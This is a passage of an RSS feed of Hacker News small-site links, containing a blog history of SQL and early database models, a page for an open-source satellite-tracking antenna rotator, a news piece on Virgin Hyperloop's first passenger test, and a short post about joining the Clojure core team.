</p><!--kg-card-end: html--><hr><h2 id="history-of-early-database-management-ids-and-codasyl">History of Early Database Management - IDS and CODASYL</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/image-3.png" alt="Charles Bachman - inventor of the the database management system"><figcaption><a href="https://www.slashdb.com/2015/10/09/flashback-friday-charles-bachman/">Image Source</a></figcaption></figure><p>In 1962, Charles W. Bachman (no relation to Erlich Bachman) was working as part of a small team at General Electric. One year later, Bachman’s team introduced what would later be recognized as the first database management system - the Integrated Data Store (IDS).</p><p>10 years later, Bachman would receive the coveted <a href="https://amturing.acm.org/">Turing Award</a>, often called the Nobel Prize of computer science, for his contributions to computing with IDS. </p><h3 id="what-was-ids">What was IDS?</h3><p>In the early 1960s, computer science was just beginning as an academic field. For context, ASCII was not introduced until 1963.</p><p>To understand IDS we have to first understand the two main forces that led to its development: </p><ol><li>The introduction of disk storage</li><li>A migration to high-level programming languages</li></ol><!--kg-card-begin: markdown--><h5 id="diskstorage">Disk storage</h5>
<!--kg-card-end: markdown--><figure><img src="https://blog.arctype.com/content/images/2021/01/image-1.png" alt="Workers moving a RAMAC 305"><figcaption>Above: <a href="https://calisphere.org/item/ark:/13030/kt80003844/">Moving a RAMAC 305</a></figcaption></figure><p>In 1956, IBM introduced the first commercial hard disk drive, the <a href="https://www.computerhistory.org/storageengine/first-commercial-hard-disk-drive-shipped/#:~:text=Informed%20by%20Jacob%20Rabinow's%20ideas,of%20Accounting%20and%20Control)%20system.">RAMAC 305</a>.</p><p>The introduction of disk drives allowed programmers to retrieve and update data by jumping directly to a location on the disk. This was a vast improvement from its predecessor, tape drives, which required moving sequentially through the tape to retrieve a specific piece of data. </p><p>But developers now had to figure out where records were stored on the disk. Due to the limitations of <a href="https://medium.com/@princeabhishek410/understanding-file-management-system-in-operating-system-4c7fbfc306f2">file management systems</a> in early operating systems, this was an advanced task reserved only for experienced programmers. </p><p>Developers needed a solution to simplify working with disk drives.</p><!--kg-card-begin: markdown--><h5 id="highlevelprogramming">High-level programming</h5>
<!--kg-card-end: markdown--><p>At the same time, computer science was beginning to move from innovators to early adopters on the <a href="https://en.wikipedia.org/wiki/Diffusion_of_innovations">adoption curve</a>. Low level programming languages like Assembly were popular among the early academics, but regular programmers were switching to higher level programming languages like COBOL for their usability.</p><p><a href="https://cacm.acm.org/magazines/2016/7/204036-how-charles-bachman-invented-the-dbms-a-foundation-of-our-digital-world/fulltext?mobile=false#body-3">So what was IDS?</a> IDS solved for disk storage and high-level programming. IDS allowed developers to use high-level programming languages, like COBOL, to build applications that input and retrieve data from disk storage. Because of this function, IDS has received the distinction as the first database management system.</p><h3 id="codasyl-a-new-standard-for-database-management">CODASYL - A new standard for database management</h3><p>In 1969, the Committee of Data Systems Languages (CODASYL) released a report proposing a standard for database management. Bachman was part of the committee, and the report drew heavily from IDS. </p><p>The CODASYL Data Model introduced many of the core features in database management systems that we use today:</p><ul><li>Schemas</li><li>Data definition language (DDL)</li><li>Data manipulation language (DML)</li></ul><p>Most importantly, IDS and CODASYL introduced a new way for modeling data that influenced the eventual development of SQL - the <strong>network data model</strong>.</p><h2 id="the-network-data-model-better-than-todays-relational-model">The Network Data Model - Better Than Todays Relational Model?</h2><figure><img src="https://lh5.googleusercontent.com/NxY7lsez_qxOIV5dLEXwJf-lbwhDo27cQ5JsEHUM0Tw-20M_nRfW_8rKPa571f9uwavlTFvRb0HoZGv13LFHEbRy7i_3atsXMzh1DlWUa0_1V6SZHdDeaN53nHMLhydHTc0yolyN" alt="Example of a Network Data Model"><figcaption>Above: Network model example</figcaption></figure><p>A data model is a standardized way to describe (model) the world (data). </p><p>The previous hierarchical data model used tree structures to describe data, but these were limited to one-to-many relationships. The new network model allow records to have multiple parents, which created a <strong>graph structure</strong>. By allowing multiple parents, network models were able to model many-to-one and many-to-many relationships. </p><p>In the network model, relationships between tables were stored in <em>sets</em>. Each set had an <em>owner</em> (i.e. teachers) and one or more <em>members</em> (i.e. classes and students).</p><p>One of the key benefits of the network model is that related records in a set were connected directly by pointers. Sets were implemented using next, prior, and owner pointers, which allowed for easy traversal similar to a linked list. </p><p>The low-level nature of network data models offered performance benefits, but they came at a cost. The network data model had increased storage costs because every record had to store extra pointers to its previous and parent record.</p><h2 id="arrival-of-the-relational-model">Arrival of The Relational Model</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/image-4.png" alt="Example of the relational data model - Tuples, Relations, and Attributes" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/image-4.png 600w, https://blog.arctype.com/content/images/2021/01/image-4.png 751w" sizes="(min-width: 720px) 720px"><figcaption>Above: <a href="http://www.myrgpvdbms.com/2018/05/define-terms-domain-tuple-attribute-and.html">Example of a relational model</a></figcaption></figure><p>In 1970, 8 years afters IDS, Edgar F. Codd introduced the relational model in his seminal paper <a href="https://www.seas.upenn.edu/~zives/03f/cis550/codd.pdf">“A Relational Model of Data for Large Shared Data Banks”</a> (also earning him a spot with Bachman as a Turing Award recipient).</p><p>Codd showed that all data in a database could be represented in terms of <em>tuples </em>(<em>rows</em> in SQL) grouped together into <em>relations </em>(<em>tables</em> in SQL). To describe the database queries, he invented a form of first-order predicate logic called <a href="https://www.geeksforgeeks.org/tuple-relational-calculus-trc-in-dbms/">tuple relational calculus</a>.</p><p>Tuple relational calculus introduced a <strong>declarative language</strong> for querying data. Declarative programming languages allow programmers to say <em>what </em>they want to do without describing <em>how </em>to do it.</p><p>This new declarative language was much easier to use for developers. The relational model laid out all the data in the open. Developers could retrieve all the data from a table, or read a single row, in one command. (thanks <a href="https://en.wikipedia.org/wiki/Query_optimization">query optimizer</a>)</p><p>Gone were the days of following a labyrinth of pointers to find your data. &nbsp;</p><h2 id="relational-vs-network-data-models">Relational vs Network Data Models</h2><p>Relational databases decreased the high storage costs that network databases had by <strong>normalizing data</strong>. Normalization was a process of decomposing tables to eliminate redundancy, and thereby decrease the footprint of data on disk.</p><p>However, relational databases had an increased CPU cost. In order to process normalized data, relational databases had to load tables in memory and use compute power to “join” tables back together. Let’s walk through the process for finding all classes and students for a given teacher with a relational model.</p><p>The database system would first perform an operation to retrieve all relevant classes. Then it would perform a second operation to retrieve student data. All of this data would be stored in memory, and it would run a third operation to merge the data before returning the result.</p><figure><img src="https://lh4.googleusercontent.com/8BGzrtrrXJig9p_y8RvzWdS36JEeCde97G5kyEKvwj70aeTiQTu7HkhiYmXJAYpJNykrWNVkI3NpQVaxpTZ2aNFZZSQwv7Nj2-QukpxKMm1pr8EivCMs0bb1dRrke3EBYITqAYIN" alt="Performance comparison between relational and network models"><figcaption>Performance comparison between relational and network models</figcaption></figure><p>In a performance case study using real data, <a href="https://raima.com/network-model-vs-relational-model/">Raima</a> found that network database models had 23x better insert performance and 123x faster query performance.</p><p>So why are relational databases the leading database solution?</p><p><strong>Usability</strong>.</p><p>The relational model was more flexible to changes, and its declarative syntax simplified the job for programmers. </p><p>And Moore’s law was working its magic in the background. The cost of computing continued to decrease, and eventually the increased computing cost of relational models was outweighed by the productivity gains. </p><p>Fast forward 50 years, and now the most expensive resource in a data center is the CPU. <a href="http://www.arctype.com/downloads">Sign up for Arctype</a> and get notified of a future post where I discuss what databases might look like over the next 50 years.</p><!--kg-card-begin: html--><p>
    <h3>The best SQL content in your inbox</h3>
    
</p><!--kg-card-end: html--><h2 id="the-rise-and-reign-of-sql">The Rise and Reign of SQL</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/arctype-brain-trust.png" alt="SQL meme" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/arctype-brain-trust.png 600w, https://blog.arctype.com/content/images/2021/01/arctype-brain-trust.png 749w" sizes="(min-width: 720px) 720px"></figure><p>And finally, we've come to the arrival of the SQL that we all love. &nbsp;</p><p>4 years after the publication of Codd’s paper, Donald Chamberlin and Raymond Boyce published “<a href="https://dl.acm.org/doi/10.1145/800296.811515">SEQUEL: A Structured English Query Language</a>”.</p><p>They described SEQUEL as “a set of simple operations on tabular structures, […] of equivalent power to the first order predicate calculus.” IBM saw the potential and moved quickly to develop the first version of SEQUEL as part of their System R project in the early 1970s.</p><p>The name would later change to SQL due to <a href="https://en.wikipedia.org/wiki/SQL">trademark issues</a> with the UK-based Hawker Siddeley aircraft company.</p><p>The next big step in SQL's adoption was almost a decade later. In 1986, the American National Standards Institute (ANSI) and the International Organization for Standardization (ISO) published the first official SQL standard: <strong>SQL-86</strong>. The standard broke down <a href="https://www.db-book.com/">SQL in several parts</a>:</p><ul><li><strong>Data Definition Language (DDL):</strong> commands to define and modify schemas and relations</li><li><strong>Data Manipulation Language (DML):</strong> commands to query, insert and delete information from a database</li><li><strong>Transaction Control:</strong> commands specifying the timing of transactions</li><li><strong>Integrity:</strong> commands to set constraints in the information in a database</li><li><strong>Views:</strong> commands to define Views</li><li><strong>Authorization:</strong> commands to specify user access</li><li><strong>Embedded SQL:</strong> commands that specify how to embed SQL in other languages</li></ul><h3 id="competitors-to-sql">Competitors to SQL</h3><p>Between 1974 to today there have been numerous competitors that have tried stealing market share from SQL’s dominance as a query language. These new syntaxes often catered to a specific, new technology:</p><ul><li>Lisp -&gt; <a href="https://www.quicklisp.org/beta/UNOFFICIAL/docs/clsql/doc/index.html">CLSQL</a></li><li>.NET -&gt; <a href="https://docs.microsoft.com/en-us/dotnet/csharp/linq/">LINQ</a></li><li>Ruby on Rails -&gt; <a href="https://guides.rubyonrails.org/active_record_querying.html">ActiveRecord</a></li></ul><p>Fast forward 35 years and SQL is still ubiquitous with databases. How has SQL maintained its reign as a query language, and what can we learn from its story?</p><h2 id="the-secret-to-sqls-50-year-reign-and-what-we-can-learn">The Secret to SQLs 50 Year Reign - And What We Can Learn</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/stack.png" alt="SQL is a very popular programming language" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/stack.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/01/stack.png 1000w, https://blog.arctype.com/content/images/2021/01/stack.png 1156w" sizes="(min-width: 720px) 720px"><figcaption>Above: <a href="https://insights.stackoverflow.com/survey/2017#technology">Stack Overflow Developer Survey, 2017</a></figcaption></figure><p>We started this story with Bachman’s introduction of the first database management system, IDS. We talked about how the shift to disk storage and high-level programming necessitated a new way of working with data. Then CODASYL came and standardized database management. IDS and CODASYL introduced the new network data model, and finally Codd dropped the relational model.</p><p>This happened over <em>eight years</em>.</p><p>How did SQL manage to stick around for the next 50 years? I think these are …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.arctype.com/sql-50-years/">https://blog.arctype.com/sql-50-years/</a></em></p>]]>
            </description>
            <link>https://blog.arctype.com/sql-50-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794929</guid>
            <pubDate>Fri, 15 Jan 2021 19:13:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Satran Satellite Tracking Antenna]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25794849">thread link</a>) | @zenbryo
<br/>
January 15, 2021 | https://www.danaco.se/satellite-tracker-antenna/ | <a href="https://web.archive.org/web/*/https://www.danaco.se/satellite-tracker-antenna/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content">


			
				<article id="post-664" class="page">

				
					<div>
					<div id="et-boc">
			
		<div>
			<div>
		<div>
				
				
				
				
					 <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2019/04/divider.png" alt="" title="" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2019/04/divider.png 1920w, https://www.danaco.se/wp-content/uploads/2019/04/divider-300x14.png 300w, https://www.danaco.se/wp-content/uploads/2019/04/divider-768x36.png 768w, https://www.danaco.se/wp-content/uploads/2019/04/divider-1024x48.png 1024w, https://www.danaco.se/wp-content/uploads/2019/04/divider-1080x51.png 1080w" sizes="(max-width: 1920px) 100vw, 1920px"></span>
			</p>
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/rendering.jpg" alt="" title="rendering" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/rendering.jpg 756w, https://www.danaco.se/wp-content/uploads/2021/01/rendering-480x507.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 756px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column --><div>
				
				
				<div>
				
				
				<p><h2>Automatic Antenna Rotator for Amateur Radio Satellites</h2></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<div><p><strong>Kits will be available very soon</strong>, but if you have a 3D-printer you can buy only the electronics and print most parts yourself, since the hardware is open source.</p>
<p>The onboard microprocessor has wifi-capability and can be controlled automatically with an easy to use android app.</p>
<p>The rotator has a mount that allows for many different kinds of antennas, a small satellite dish or perhaps even a camera.</p>
<p>All in all, SATRAN might be the only Az-El rotator for less than 200USD on the market.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2020/12/satellite-app.jpg" alt="" title="satellite-app" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2020/12/satellite-app.jpg 1280w, https://www.danaco.se/wp-content/uploads/2020/12/satellite-app-980x554.jpg 980w, https://www.danaco.se/wp-content/uploads/2020/12/satellite-app-480x272.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1280px, 100vw"></span>
			</p><div>
				
				
				<p><em>Screenshot of the first android prototype app, currently in development</em></p>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				 <!-- .et_pb_column --><div>
				
				
				 <!-- .et_pb_text --><div>
				
				
				<div><p>Amateur radio is a great hobby for tech lovers and today there are a variety of satellites that even non-licensed hobbyists can listen to using cheap SDR equipment (Software Defined Radio). Some send simple telemetry-data and others even allow two-way communication.</p>
<p>Many “CubeSATs” are now also in orbit – small, privately funded satellites built by schools, universities and enthusiasts. Even the international space station regularly transmits images by radio, using what is called “Slow Scan TV”.</p>
<p><span><a href="https://www.amsat.org/" target="_blank" rel="noopener">Learn more at AMSAT.org</a></span></p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<p><h2><em>“Make Space Accessible to All”</em></h2></p>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-inside-1.jpg" alt="" title="render-inside" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-inside-1.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-inside-1-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column --><div>
				
				
				 <!-- .et_pb_text --><div>
				
				
				<div><p>The outer dimensions are only approx 18x15x15cm and houses both the Nema17 stepper motors and the controller board inside the black, splash-proof casing.</p>
<p>The hardware consists mainly of 3D-printed parts, CNC-cut plastic sides and a top cover in aluminium sheet metal.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg" alt="" title="render-bottom" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p><div>
				
				
				<p><h3>Cables run through center</h3></p>
			</div> <!-- .et_pb_text --><div>
				
				
				<div><p>The azimuth turntable has no center, allowing for power and RF cables to run through. Perfect for mounting it on top of a pipe.</p>
<p>Limit switches keep track of the turntables position, not to twist the cables too far. In the future I hope to offer slip rings (rotary cable joint) as an upgrade option, allowing endless rotation.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column --><div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg" alt="" title="render-bottom" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-bottom-1-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-wifi.jpg" alt="" title="render-wifi" height="auto" width="auto" srcset="https://www.danaco.se/wp-content/uploads/2021/01/render-wifi.jpg 928w, https://www.danaco.se/wp-content/uploads/2021/01/render-wifi-480x380.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 928px, 100vw"></span>
			</p>
			</div> <!-- .et_pb_column --><div>
				
				
				 <!-- .et_pb_text --><div>
				
				
				<div><p>Communication with the tracker runs over HTTP via your local WLAN-setup (b/g/n), no cables needed. It can even be controlled over the Internet if you want it to.</p>
<p>The smartphone app for android can be used to control the rotor, but interfacing with other positioning software might be possible in the future.</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row --><div>
				<div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-angles.gif" alt="" title="render-angles" height="auto" width="auto"></span>
			</p> <!-- .et_pb_text --><div>
				
				
				<p>The azimuth can turn a full 360 degrees, and the elevation approximately 100 degrees from zenith, covering the entire sky even when mounted high above the horizon.</p>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column --><div>
				
				
				<p><span><img loading="lazy" src="https://www.danaco.se/wp-content/uploads/2021/01/render-angles.gif" alt="" title="render-angles" height="auto" width="auto"></span>
			</p>
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<div><h4><strong>Follow the project at Hackaday.io</strong></h4>
<p><em>The prototyping is featured on Hackaday where the development is being documented as a blog.</em></p>
<p><a href="https://hackaday.io/project/176381-satran-satellite-tracker-antenna" target="_blank" rel="noopener noreferrer">Visit Hackaday.io</a> »</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column --><div>
				
				
				<div>
				
				
				<div><h4><strong>Feel free to donate</strong></h4>
<p>Development and prototyping is expensive and my resources are very limited. Donate and help make the project open source.</p>
<p><a href="https://www.paypal.com/donate?hosted_button_id=PX7XKDZMJ2WB2" target="_blank" rel="noopener">Donate with PayPal</a> »</p></div>
			</div> <!-- .et_pb_text -->
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section --><div>
				
				
				
				
					<div>
				<div>
				
				
				<div>
				
				
				<div><h2>I want to buy one!</h2>
<p>Leave your e-mail and get a reminder when kits are available for purchase</p></div>
			</div> <!-- .et_pb_text -->
			 <!-- .et_pb_contact_form_container -->
			
			</div> <!-- .et_pb_column -->
				
				
			</div> <!-- .et_pb_row -->
				
				
			</div> <!-- .et_pb_section -->		</div><!-- .et_builder_inner_content -->
	</div><!-- .et-l -->
	
			
		</div><!-- #et-boc -->
							</div> <!-- .entry-content -->

				
				</article> <!-- .et_pb_post -->

			

</div></div>]]>
            </description>
            <link>https://www.danaco.se/satellite-tracker-antenna/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794849</guid>
            <pubDate>Fri, 15 Jan 2021 19:07:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Hyperloop Passenger Test Completed, What's Next?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794813">thread link</a>) | @scottbucks
<br/>
January 15, 2021 | https://www.thedetechtor.com/post/first-hyperloop-passenger-test | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/first-hyperloop-passenger-test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><p id="viewer-e5as9"><span>On November 8, 2020, Virgin Hyperloop completed the first-ever human passenger <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>Hyperloop</u></a> test. This is a huge step for the company trying to bring to life Tesla and SpaceX CEO Elon Musk's vision of a futuristic, ultra-fast and environmentally friendly <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>5th mode of transportation</u></a>. How are the results from this first passenger the test and what's next for the Hyperloop? </span></p><h2 id="viewer-44kam"><span>A Bit about the Hyperloop</span></h2><p id="viewer-1etse"><span>As mentioned in a <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>previous article</u></a> about the Hyperloop, it was originally conceived by Elon Musk in 2013 and has been touted as the fastest way to cross the surface of the Earth. Possibly one of the greatest leaps in transportation for generations, the concept promises to slash journey times between cities from several hours to a matter of minutes. Musk first mentioned that he was thinking about a concept for a "fifth mode of transport", calling it the Hyperloop, in July 2012 at a PandoDaily event in Santa Monica, California. He envisions the more advanced versions will be able to go at hypersonic speed.</span></p><blockquote id="viewer-4l8mu"><span>It's cross between a Concorde, a railgun, and an air hockey table - <strong>Elon Musk - CEO of Tesla and SpaceX </strong></span></blockquote><p id="viewer-bedt"><span>Since 2015, the yearly Hyperloop Pod Competition sponsored by SpaceX allowed student and non-student teams to participate, design and for some, build a subscale prototype transport vehicle in order to demonstrate the technical feasibility of various aspects of the Hyperloop concept.</span></p><h2 id="viewer-dkdqo"><span>An Important Milestone </span></h2><p id="viewer-8io9u"><span>The test took place on November 8, 2020, at the Virgin Hyperloop's DevLoop test track in the desert outside Las Vegas, Nevada. The first two passengers were Virgin Hyperloop’s chief technology officer and co-founder, Josh Giegel, and head of passenger experience, Sara Luchian. </span></p><p id="viewer-2jrma"><span>The test was completed with the newly-unveiled XP-2 vehicle, which was custom-built with occupant safety and comfort in mind. While the production vehicle will be larger and seat up to 28 passengers, this 2-seater XP-2 vehicle was built to demonstrate that passengers can in fact safely travel in a hyperloop vehicle.</span></p><p id="viewer-91v5a"><span>The pod accelerated up to 100 miles per hour (160 km/h) down the length of the 500 meters long track, before slowing down to a stop.</span></p><p id="viewer-b9ns9"><span>This is an incredible milestone for Virgin Hyperloop, one of the leaders in the race to build the first fully functional Hyperloop system, as it proves the safety of this futuristic mode of transport.</span></p><blockquote id="viewer-2ftb9"><span>"I can’t tell you how often I get asked ‘is hyperloop safe?’, with today’s passenger testing, we have successfully answered this question" - <strong>Jay Walder, CEO of Virgin Hyperloop</strong></span></blockquote><h2 id="viewer-e8h4d"><span>What's Next?</span></h2><p id="viewer-4ab2"><span>This is not only a big step for Virgin Hyperloop, but it will also motivate other companies working on this technology, like <a href="https://www.hyperlooptt.com/" target="_blank" rel="noopener"><u>Hyperloop Transportation Technology</u></a> (HTT), <a href="https://www.transpod.com/" target="_blank" rel="noopener"><u>Transpod Inc</u></a>, or even <a href="https://tumhyperloop.de/" target="_blank" rel="noopener"><u>TUM Hyperloop</u></a>, a student team from the Technical University of Munich, to perform similar tests bring us closer to a faster, safer and greener future.</span></p><p id="viewer-do2ms"><span>All of these companies are working closely with governments and partners to help advance their technology and construction, in countries like India, the United States, Belgium, France and the United Arab Emirates.</span></p><p id="viewer-ccijs"><span>For more about the Hyperloop, <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>check out our article</u></a> covering <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>everything you need</u></a> to know about this futuristic technology, from how it works, to who's building it, to what the potential cost could be! You can also listen to <a href="https://www.thedetechtor.com/podcast/episode/3244d976/hyperloop-is-it-the-future-of-travel" target="_blank" rel="noopener"><u>Episode 2 of The Detechtor Podcast</u></a> where we discuss the Hyperloop, and whether it's the future of travel?</span></p><h3 id="viewer-5cmp0"><span><span>More from The Detechtor:</span></span></h3><ul><li id="viewer-cg02b"><p><span>🏭 </span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><u><strong>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</strong></u></a></p></li><li id="viewer-97bdu"><p><strong>⌚️ </strong><a href="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" target="_blank" rel="noopener"><strong><u>Fitness Trackers: Helping us Get Fit or Just Another Gadget?</u></strong></a></p></li><li id="viewer-ai6pm"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><h3 id="viewer-epklr"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-4uc6o"><p>📩 Want the latest on the impact of tech? <a href="http://thedetechtor.com/subscribe" target="_blank" rel="noopener"><strong><u>Subscribe</u></strong></a> to our <a href="http://thedetechtor.com/subscribe" target="_blank" rel="noopener"><strong><u>newsletter</u></strong></a>!</p></li><li id="viewer-1qfk"><p>🎙 <strong>NEW</strong>! <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is now available on all podcast players!                                 <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-du0kr"><p>📲 Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | <a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/first-hyperloop-passenger-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794813</guid>
            <pubDate>Fri, 15 Jan 2021 19:05:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure Core]]>
            </title>
            <description>
<![CDATA[
Score 158 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25794739">thread link</a>) | @tosh
<br/>
January 15, 2021 | http://blog.fogus.me/2021/01/15/clojure-core/ | <a href="https://web.archive.org/web/*/http://blog.fogus.me/2021/01/15/clojure-core/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">

                <div id="post-6729">
                 <h3><a href="http://blog.fogus.me/2021/01/15/clojure-core/" title="Clojure Core">Clojure Core</a></h3>
                 <p><span>Jan 15, 2021 </span></p><p>Earlier today Rich Hickey let the cat out of the bag that <a href="https://twitter.com/richhickey/status/1350110634776657920">I’m joining the Clojure Core</a> development team.</p>

<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">We are excited to welcome <a href="https://twitter.com/fogus?ref_src=twsrc%5Etfw">@fogus</a>, long-time Clojure contributor and co-author of Joy of Clojure, to the Clojure core team!</p>— Rich Hickey (@richhickey) <a href="https://twitter.com/richhickey/status/1350110634776657920?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote>

<p>This is a change from my previous relationship with the Clojure Core team that in the past few years has been sporadic at best. This circumstance arose through necessity rather than desire and so I’m overjoyed to work closely with the team once again. Over the past few years <a href="https://twitter.com/puredanger">Alex Miller</a> has exerted a Herculean effort in shepherding the language through numerous versions and steady growth. I’m overjoyed to be given the opportunity to join him in helping push the language forward, and I’ll do my very best to avoid breaking everything.</p>

<p>So what this means is that I’ll be far more visible<sup id="fnref:v"><a href="#fn:v" rel="footnote">1</a></sup> in and around the Clojure ecosystem while spending my time thinking about Clojure more so than just using Clojure.<sup id="fnref:cljs"><a href="#fn:cljs" rel="footnote">2</a></sup></p>



            </div>
            <!-- end comments_wrapper -->            </div></div>]]>
            </description>
